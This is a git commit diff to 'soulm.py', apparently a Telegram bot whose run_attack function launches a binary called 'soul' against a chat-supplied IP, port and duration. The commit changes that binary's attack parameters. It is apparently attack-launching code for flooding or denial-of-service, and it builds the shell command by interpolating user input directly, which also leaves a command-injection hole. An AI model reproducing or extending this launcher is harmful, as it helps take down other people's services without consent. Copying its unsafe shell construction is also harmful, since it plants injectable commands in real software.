16f68ac4e04ad3d1ee7a25ecd44e724b91c9e855
papajihukya <pmmourya551@gmail.com>
2025-02-02 02:03:06 +0530

    Update soulm.py

--- soulm.py
+++ soulm.py
@@ -160,7 +160,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {duration} 110",
+            f"./soul {ip} {port} {duration} {1} 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
